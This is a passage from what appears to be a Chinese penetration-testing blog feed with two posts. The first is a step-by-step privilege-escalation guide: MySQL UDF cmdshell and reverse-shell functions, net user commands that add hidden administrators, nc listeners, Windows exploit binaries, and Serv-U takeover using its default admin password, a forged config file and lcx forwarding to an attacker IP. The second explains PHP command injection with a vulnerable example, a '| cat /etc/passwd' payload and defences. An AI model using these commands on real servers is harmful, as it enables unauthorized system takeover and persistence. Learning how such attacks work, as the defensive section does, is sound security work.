<p><strong>适用场合：</strong><br>1、目标主机系统是Windows（Win2000、XP、Win2003）。<br>2、拥有该主机mysql中的某个用户账号，该账号需要有对mysql的insert和delete权限。</p>
<p><strong>使用方法：</strong><br>1、获取当前mysql的一个账号，一般情况下在网站的config.php文件就能找到（具体在哪个文件每个CMS都不一样）。<br>2、把udf专用的webshell传到服务器上，访问并进行数据库连接。<br>3、连接成功后，导出DLL文件。mysql<5.0，导出路径随意；5.0<=mysql<5.1，则需要导出至目标服务器的系统目录（如：system32），否则在下一步操作中你会看到“no paths="" allowed="" for="" shared="" library”错误；mysql="">5.1，需要使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">show variables like &apos;%plugin%&apos;;</div></pre></td></tr></table></figure></5.0，导出路径随意；5.0<=mysql<5.1，则需要导出至目标服务器的系统目录（如：system32），否则在下一步操作中你会看到“no></p>
<p>语句查看插件安装路径，导出的时候指定DLL路径为插件路径。<br>回显如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">mysql&gt; show variables like &apos;%plugin%&apos;;</div><div class="line">+---------------+------------------------------------------+</div><div class="line">| Variable_name | Value                                    |</div><div class="line">+---------------+------------------------------------------+</div><div class="line">| plugin_dir    | E:\wamp\bin\mysql\mysql5.5.20\lib/plugin |</div><div class="line">+---------------+------------------------------------------+</div></pre></td></tr></table></figure></p>
<p>4、使用SQL语句创建自定义函数。语法如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Create Function 函数名 returns string soname &apos;导出的DLL路径&apos;;</div><div class="line">// eg:Create Function cmdshell returns string soname &apos;udf.dll&apos;;</div></pre></td></tr></table></figure></p>
<p>常用函数名：</p>
<pre><code>cmdshell    执行cmd;
downloader  下载者,到网上下载指定文件并保存到指定目录;
open3389    通用开3389终端服务,可指定端口(不改端口无需重启);
backshell   反弹Shell;
ProcessView 枚举系统进程;
KillProcess 终止指定进程;
regread     读注册表;
regwrite    写注册表;
shut        关机,注销,重启;
about       说明与帮助函数;
</code></pre><p>若mysql&gt;=5.0，语句中的DLL不允许带全路径，如果在第二步中已将DLL导出到系统目录，那么你就可以省略路径而使命令正常执行，否则将会看到”Can’t open shared library“错误。<br>如果提示“Function ‘cmdshell’ already exists”，则输入下列语句可以解决：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">delete from mysql.func where name=&apos;cmdshell&apos;</div></pre></td></tr></table></figure></p>
<p>5、创建函数成功后，就可以通过sql语句去调用它了。语法如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">select 创建的函数名 (&apos;参数列表&apos;);</div><div class="line">// eg:select cmdshell(&quot;net user hacker 12345 /add&quot;); 创建一个用户hacker，密码为12345</div></pre></td></tr></table></figure></p>
<p> 6、函数使用完后，我们需要把之前生成的DLL和创建的函数删除掉，但要注意次序，必须先删除函数再删除DLL。删除函数的语法如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">drop function 创建的函数名;</div><div class="line">// eg:drop function cmdshell;</div></pre></td></tr></table></figure></p>
<p><strong>具体流程如下：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">create function cmdshell returns string soname &apos;udf.dll&apos;;</div><div class="line">select cmdshell(&apos;net user waitalone waitalone.cn /add&apos;);</div><div class="line">select cmdshell(&apos;net localgroup administrators waitalone /add&apos;);</div><div class="line">drop function cmdshell; 删除函数</div><div class="line">delete from mysql.func where name=&apos;cmdshell&apos;  删除函数</div></pre></td></tr></table></figure></p>
<p>注意：<br>1、导出的文件名不一定非是xxx.dll，可以是任意的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">create function sys_eval returns string soname &apos;udf.xox&apos;;</div></pre></td></tr></table></figure></p>
<p>2、提示错误 Can’t open shared library ‘fun.dll’ (errno: 2 )<br>除了udf不存在、udf被杀，还有可能是你的udf版本不对，你拿32位的udf去在64位系统注册的话，一样会提示错误。<br>3、某些情况下，我们会遇到Can’t open shared library的情况，这时就需要我们把udf.dll导出到lib\plugin目录下才可以，但是默认情况下plugin不存在，可以利用NTFS ADS流来创建文件夹的方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">select @@basedir;  //查找到mysql的目录</div><div class="line">select &apos;It is dll&apos; into dumpfile &apos;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib::$INDEX_ALLOCATION&apos;;  //利用NTFS ADS创建lib目录</div><div class="line">select &apos;It is dll&apos; into dumpfile &apos;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION&apos;; //利用NTFS ADS创建plugin目录</div></pre></td></tr></table></figure></p>
<p>4、降权的mysql一样有用，能注册dll的话你一样能够执行命令，不过权限是根据mysql来的， 在不支持aspx，ws、shell.application被删得情况下还有一丝希望。</p>
<h4 id="0x02-反弹端口连接提权"><a href="#0x02-反弹端口连接提权" class="headerlink" title="0x02 反弹端口连接提权"></a>0x02 反弹端口连接提权</h4><p>假如我们扫到了一个mysql的root弱密码，并且可以外连，但是服务器上面的网站又无法Getshell，这时我们怎么办呢？<br>1、利用mysql客户端工具连接mysql服务器，然后执行下面的操作。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mysql.exe -h 172.16.10.11 -uroot -p</div><div class="line">Enter password:</div><div class="line">mysql&gt; \. c:\mysql.txt</div><div class="line">mysql&gt;select backshell(&quot;YourIP&quot;,2010);</div></pre></td></tr></table></figure></p>
<p>2、本地监听你反弹的端口<br>nc.exe -vv -l -p 2010<br>成功后，将获得一个system权限的cmdshell，其实这个也是利用的UDF提权。</p>
<h3 id="0x02-Windows提权"><a href="#0x02-Windows提权" class="headerlink" title="0x02 Windows提权"></a>0x02 Windows提权</h3><p>操作系统漏洞提权<br>systeminfo<br>查看修补的补丁编号<br>PR               -pr.exe<br>巴西烤肉<br>IIS6溢出     -iis6.exe<br>LPK劫持     -lpk.dll</p>
<p>当我们拿到一个低权限的webshell后，一般先探测服务器内部的信息，以找见可以提权的条件和桥梁。什么叫服务器的总体环境呢？例如：目标服务器开启的端口、进程、系统服务，安装了哪些程序，系统安全的大体设置。</p>
<p><strong>为什么要获取服务器的这些总体信息呢？</strong><br>1、端口信息，可以让我们知道服务器开了哪些端口？哪些端口可以利用？哪些端口对应的服务或程序可以利用？或是对方还开了哪些我们不知道的服务（比如对方又开了一些不常用的端口来运行高权限的WEB服务，如tomcat等）。<br>比如，SERV-U修改了本地管理端口，我们也可以通过端口和进程信息进行了解。<br>2、进程信息，可以让我们知道服务器运行了哪些程序，管理员喜欢开什么程序，或正在运行什么程序。有哪些防护（比如杀毒软件，防火墙等信息）<br>3、系统服务信息，可以让我们了解，哪些服务是运行的，哪些服务可以利用。第三方服务的路径以及启动方式等信息。<br>如果第三方服务，是装在某些特殊目录，我们可以通过查询系统服务信息获得后，用CACLS命令查询其是否有权限进行修改或写入等操作。若可以写入，或修改，我们就可以替换或修改服务程序来达到提权的目的。<br>4、系统环境变量，也可以让我们获得一些信息，比如安装了哪些程序，哪些变量我们可以利用。<br>5、系统权限的设置的探测，我们可以通过一些疏漏的地方进行利用，以达到提权的目的。</p>
<p>通过常规web渗透，已经拿到webshell。那么接下来作重要的就是探测系统信息，提权，针对windows想办法开启远程桌面连接，针对linux想办法使用反弹shell来本地连接。<br>Webshell应该都可以调用系统cmd执行一些简单的命令，那么whoami（查看当前权限），netuser（查看用户/组），systeminfo（查看系统补丁修复情况）等常见命令应该是首先被执行探测的。</p>
<p>Windows常见提权思路：(前提已经getshell但是权限不大的前提下)<br>1、查看基本的信息<br><img src="http://p1.bpimg.com/567571/13147d28fa2fb8a3.jpg" alt=""><br>2、使用cmd执行命令<br>尝试使用cmd执行命令<br><img src="http://p1.bqimg.com/567571/5ffe413926ff6008.jpg" alt=""><br>找可写目录<br><img src="http://p1.bqimg.com/567571/d89407b44f300b55.jpg" alt=""><br>尝试上传cmd.exe<br><img src="http://i1.piimg.com/567571/aa0d12c24672e23f.jpg" alt=""><br>写一个ASPX马<br><img src="http://i1.piimg.com/567571/113718d1496a9569.jpg" alt=""><br>继续上传cmd.exe，并执行cmd命令<br><img src="http://i1.piimg.com/567571/7579dd7491853a30.jpg" alt=""><br>3、提升权限<br>查看未安装补丁<br><img src="http://p1.bpimg.com/567571/a2fdef79c17c6a60.jpg" alt=""><br>上传exp（iss6.exe）提权<br><img src="http://p1.bqimg.com/567571/e4a178638e6ba70d.jpg" alt=""><br><img src="http://p1.bqimg.com/567571/0f75bb881053f077.jpg" alt=""><br>4、添加用户<br>添加远程连接用户<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">net user hacker 123 /add </div><div class="line">net localgroup administrators hacker /add</div></pre></td></tr></table></figure></p>
<h3 id="0x03-Server-U提权"><a href="#0x03-Server-U提权" class="headerlink" title="0x03 Server-U提权"></a>0x03 Server-U提权</h3><p>Serv-U提权，属于一种漏洞，该漏洞是使用Serv-u本地默认管理端口，以默认管理员登陆新建域和用户来执行命令。<br>漏洞是使用Serv-u本地默认管理端口，以默认管理员登陆新建域和用户来执行命令，Serv-u&gt;3.x版本默认本地管理端口是：43958，默认管理员：LocalAdministrator，默认密码：#l@$ak#.lk;0@P，这是集成在Serv-u内部的，可以以Guest权限来进行连接，对Serv-u进行管理。</p>
<p>serv-u提权主要分为serv-u6及以前版本、serv-u7以下版本的提权，serv-u7版本提权等</p>
<p><strong>主要提权方法：</strong></p>
<p>一、serv-u ftp本地溢出权限提升(使用6.0以及以前版本)</p>
<p>1、用Serv-U提权综合工具生成提权工具serv_u.exe<br>2、先上传 serv_u.exe 到一个盘符下 比如是d盘<br>3、执行命令 d:\serv_u.exe<br>4、d:\serv_u.exe “net user username password /add” (注意命令要有引号)<br>5、d:\serv_u.exe “net localgroup administrators username /add” (注意命令要有引号)</p>
<p>二、ServUDaemon.ini 文件重写后提权(对ServUDaemon.ini有写入的权限)</p>
<p>先修改Domain来添加用户<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[Domain1]</div><div class="line">User2=spider|1|0</div></pre></td></tr></table></figure></p>
<p>然后在ServUDaemon.ini文件尾部追下如下代码来添加用户的详细信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">[USER=spiger|1]</div><div class="line">Password=sbd8b58b5c201ee5cc20f9a8551197d4a5</div><div class="line">HomeDir=c:\</div><div class="line">RelPaths=3</div><div class="line">TimeOut=600</div><div class="line">Maintenance=System</div><div class="line">Access1=C:\|RWAMELCDP</div><div class="line">Access2=d:\|RWAMELCDP</div><div class="line">Access3=e:\|RWAMELCDP</div><div class="line">SKEYValues=</div></pre></td></tr></table></figure></p>
<p>添加上述代码并保存后，就会在serv-u中添加用户名为spiger，密码是123456。<br>通过在本地命令行执行ftp 目标IP地址  命令来连接目标FTP服务器。连接后<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">quote site exec net user spiger 123456 /add</div><div class="line">quote site exec net localgroup administrators spiger /add</div></pre></td></tr></table></figure></p>
<p>ps：上述添加的文件中最重要的是Maintenance=System这句，有了这句添加的FTP用户才是管理员用户，才会有命令执行权限（因为最后是通过FTFP执行命令来添加系统用户的）。</p>
<p>三、serv-u配置文件无修改权限，但是可以看到配置文件，进行口令破解</p>
<p>看到FTP用户的配置文件ServUDaemon.ini，在其中找到Maintenance=System的用户，该用户就是系统管理员。如果能够成功破解系统管理员的口令，就可以利用该管理员执行添加系统管理员的用户（类似方法二）。<br>serv-u配置文件中Password字段就是用户口令加密变换后的字符串，破解方法：去掉前两位，剩下的进行md5破解，破解后再去掉前两位，剩下的就是FTP用户口令。</p>
<p>四、serv-u配置文件无修改权限，可以用Serv-u管理用户来进行提权（这是最常用的方法，一般大马中集成的serv-u提权方法就是本方法）</p>
<p>serv-u的默认管理端口是43958，只有本地才能进行连接这个管理端口。serv-u默认管理账号是LocalAdministrator,默认密码是”#l@$ak#.lk;0@P“，这个密码是固定的。如果网站管理员忘记修改密码，那么获取webshell后就可以连接该端口后执行命令来添加系统用户。<br><img src="http://i1.piimg.com/567571/437f6d2666181f4c.png" alt=""><br>虽然，网站管理员很少修改serv-u的这个默认管理账号和口令，但是如果管理员修改了，我们还可以通过查看ServUAdmin.exe文件来获取管理账号和口令。方法如下：下载serv-u目录下的ServUAdmin.exe文件，在本地用文本文件打开，查找LocalAdministrator字符来获取口令位置：<br><img src="http://i1.piimg.com/567571/d95060265749733f.png" alt=""></p>
<p>可以看到serv-u的管理账号和口令都在文件中，仔细查找即可（如果连用户名也修改了，就搜127.0.0.1或记住账号和密码在文件中的位置）。获取管理账号和口令后就可以利用大马自带的serv-u来进行提权了。</p>
<p>五、serv-u ftp转发端口<br>我们可以利用端口转发的方式来将其管理端口转发的本地，进而提权。在目标Webshell上运行LCX：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">lcx -slave 你的IP 5000 127.0.0.1 43958</div></pre></td></tr></table></figure></p>
<p>在本机上运行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">lcx -listen 5000 21</div></pre></td></tr></table></figure></p>
<p>打开本地的SERV_U 在IP上填入127.0.0.1 帐号写LocalAdministrator 密码#l@$ak#.lk;0@P此时的连接过程是：本机连接21端口——&gt;转发往本机5000端口——&gt;管道连接至远程机5000端口——&gt;转发至远程43958端口<br>连接成功后，在本机登陆Serv_U就相当于登陆了远程的Serv_U。你可以FTP登陆本机IP,输入上面的帐号和密码，在远程FTP服务器上执行命令。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x01-mysql提权&quot;&gt;&lt;a href=&quot;#0x01-mysql提权&quot; class=&quot;headerlink&quot; title=&quot;0x01 mysql提权&quot;&gt;&lt;/a&gt;0x01 mysql提权&lt;/h3&gt;&lt;h4 id=&quot;0x01-UDF提权&quot;&gt;&lt;a href=&quot;#0x01-UDF提权&quot; class=&quot;headerlink&quot; title=&quot;0x01 UDF提权&quot;&gt;&lt;/a&gt;0x01 UDF提权&lt;/h4&gt;&lt;p&gt;1、利用UDF提权&lt;br&gt;udf提权这是最常见的提权方式，也就是User defined Function,用户定义函数。是一类对MYSQL服务器功能进行扩充的代码，通常是用C（或C++）写的。通过添加新函数，性质就象使用本地MYSQL函数abs()或concat()。当你需要扩展MYSQL服务器功能时，UDF通常是最好的选择。但同时，UDF也是黑客们在拥有低权限mysql账号时比较好用的一种提权方法。
    
    </summary>
    
      <category term="渗透" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="提权" scheme="http://yoursite.com/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>命令执行</title>
    <link href="http://yoursite.com/%E6%BC%8F%E6%B4%9E/2017/03/05/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.html"/>
    <id>http://yoursite.com/漏洞/2017/03/05/命令执行.html</id>
    <published>2017-03-05T03:13:23.000Z</published>
    <updated>2017-04-02T07:30:17.903Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-命令注入"><a href="#0x01-命令注入" class="headerlink" title="0x01 命令注入"></a>0x01 命令注入</h3><p>PHP命令注入攻击漏洞是PHP应用程序中常见的脚本漏洞之一，国内著名的Web应用程序Discuz!、DedeCMS等都曾经存在过该类型漏洞。</p>
<p><strong>Command Injection，即命令注入攻击</strong>，是指由于Web应用程序对用户提交的数据过滤不严格，导致黑客可以通过构造特殊命令字符串的方式，将数据提交至Web应用程序中，并利用该方式执行外部程序或系统命令实施攻击，非法获取数据或者网络资源等。<a id="more"></a></p>
<h3 id="0x02-命令注入原因"><a href="#0x02-命令注入原因" class="headerlink" title="0x02 命令注入原因"></a>0x02 命令注入原因</h3><p>PHP命令注入攻击：<br>PHP命令注入攻击存在的主要原因是Web应用程序员在应用PHP语言中一些具有命令执行功能的函数时，对用户提交的数据内容没有进行严格的过滤就带入函数中执行而造成的。例如，当黑客提交的数据内容为向网站目录写入PHP文件时，就可以通过该命令注入攻击漏洞写入一个PHP后门文件，进而实施进一步的渗透攻击。<br>在PHP中，可以执行命令的函数有system()、exec()、shell_exex()、passthru()、pcntl_exex()、popen()、proc_open()，一共七个函数，另外反引号(`)也可以执行命令，不过这种方法也是调用的shell_exec()函数。<br>PHP中可以使用下列四个函数来执行外部的应用程序或函数：<strong>system()、exec()、passthru()、shell_exec()</strong>，四个函数的原型如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">string system(string command, int &amp;return_var)</div><div class="line">    command 要执行的命令； return_var 存放执行命令的执行后的状态值。</div><div class="line">string exec (string command, array &amp;output, int &amp;return_var)</div><div class="line">    command 要执行的命令，output 获得执行命令输出的每一行字符串，return_var 存放执行命令后的状态值。</div><div class="line">void passthru (string command, int &amp;return_var)</div><div class="line">    command 要执行的命令，return_var 存放执行命令后的状态值。</div><div class="line">string shell_exec (string command)</div><div class="line">    command 要执行的命令，如下例所示，表示通过提交http://www.sectop.com/ex1.php?dir=| cat /etc/passwd操作，执行命令变成了system(&quot;ls -al | cat /etc/passwd&quot;)，输出/etc/passwd 文件的具体内容。</div></pre></td></tr></table></figure></p>
<p>//ex1.php </p>
<pre><code>&lt;?php
$dir = $_GET[&quot;dir&quot;]; 
if (isset($dir)) 
{ 
    echo &quot;&quot;; 
    system(&quot;ls -al &quot;.$dir); 
    echo &quot;&quot;; 
} 
?&gt; 
</code></pre><p>popen()、proc_open()函数不会直接返回执行结果，而是返回一个文件指针。<br>popen()需要两个参数，一个是执行的命令，另一个是指针文件的连接模式，有r和w代表读和写。</p>
<pre><code>&lt;?php
popen(&apos;whoami&apos; &gt;&gt;D:/test.txt&apos;,&apos;r&apos;);
?&gt;
</code></pre><p>执行完之后可以在D盘根目录看到test.txt文件，内容为用户名。    </p>
<p><strong>&amp;与&amp;&amp;与|的区别</strong><br>在Linux上，上面的;也可以用|、||代替<br>;前面的执行完执行后面的<br>|是管道符，显示后面的执行结果<br>||当前面的执行出错时执行后面的<br>在Windows上，不能用;可以用&amp;、&amp;&amp;、|、||代替<br>&amp;前面的语句为假则直接执行后面的<br>&amp;&amp;前面的语句为假则直接出错，后面的也不执行<br>|直接执行后面的语句<br>||前面出错执行后面的<br>Command 1&amp;&amp;Command 2<br>先执行Command 1，执行成功后执行Command 2，否则不执行Command 2<br>Command 1&amp;Command 2<br>先执行Command 1，不管是否成功，都会执行Command 2<br><img src="http://p1.bqimg.com/567571/b874cceb7f1ceedd.jpg" alt=""><br>“|”是管道符，表示将Command 1的输出作为Command 2的输入，并且只打印Command 2执行的结果。<br><img src="http://p1.bqimg.com/567571/bdc67386a04b9902.jpg" alt=""></p>
<h3 id="0x03-挖掘经验"><a href="#0x03-挖掘经验" class="headerlink" title="0x03 挖掘经验"></a>0x03 挖掘经验</h3><p>大部分直接搜索关键函数进行漏洞挖掘。</p>
<h3 id="0x04-漏洞防范"><a href="#0x04-漏洞防范" class="headerlink" title="0x04 漏洞防范"></a>0x04 漏洞防范</h3><p>PHP中命令注入攻击漏洞带来的危害和影响很严重。防范命令注入攻击漏洞的存在可以通过以下几种方法。</p>
<p>1、尽量不要执行外部的应用程序或命令。<br>2、使用自定义函数或函数库实现外部应用程序或命令的功能。<br>3、 在执行system、eval等命令执行功能的函数前，确定参数内容。<br>4、escapeshellcmd()函数会转义命令中的所有shell元字符来完成工作。这些元字符包括：#&amp;;`,|*?~&lt;&gt;^()[]{}$\。例如写入一句话可被过滤 ，所以命令无法执行成功，无法生成一句话文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">echo(escapeshellcmd($_GET[&apos;cmd&apos;]));</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p><img src="http://p1.bqimg.com/567571/5df4043ed95d4c3c.jpg" alt=""><br>可以看到这些字符过滤的方法就是在前面加了一个^符号，而在Linux下则是在子父母前面加了反斜杠()。<br>5、使用escapeshellarg函数处理相关参数。Escapeshellarg函数会将任何引起参数或命令结束的字符进行转义，如单引号“’”会被转义为“\’”，双引号“””会被转义为“\””，分号“;”会被转义为“\;”，这样escapeshellarg会将参数内容限制在一对单引号或双引号里面，转义参数中所包含的单引号或双引号，使其无法对当前执行进行截断，实现防范命令注入攻击的目的。<br>6、使用safe_mode_exec_dir执行可执行的文件路径。将php.ini文件中的safe_mode设置为On，然后将允许执行的文件放入一个目录中，并使用safe_mode_exec_dir指定这个可执行的文件路径。这样，在需要执行相应的外部程序时，程序必须在safe_mode_exec_dir指定的目录中才会允许执行，否则执行将失败。<br>7、参数白名单：可以在代码中或者配置文件中限定某些参数，在使用的时候匹配一下这个参数在不在白名单列表了里面，如果不在则直接显示错误提示即可。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x01-命令注入&quot;&gt;&lt;a href=&quot;#0x01-命令注入&quot; class=&quot;headerlink&quot; title=&quot;0x01 命令注入&quot;&gt;&lt;/a&gt;0x01 命令注入&lt;/h3&gt;&lt;p&gt;PHP命令注入攻击漏洞是PHP应用程序中常见的脚本漏洞之一，国内著名的Web应用程序Discuz!、DedeCMS等都曾经存在过该类型漏洞。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Command Injection，即命令注入攻击&lt;/strong&gt;，是指由于Web应用程序对用户提交的数据过滤不严格，导致黑客可以通过构造特殊命令字符串的方式，将数据提交至Web应用程序中，并利用该方式执行外部程序或系统命令实施攻击，非法获取数据或者网络资源等。
    
    </summary>
    
      <category term="漏洞" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E/"/>
    
    
      <category term="php" scheme="http://yoursite.com/tags/php/"/>
    
  </entry>
  
</feed>
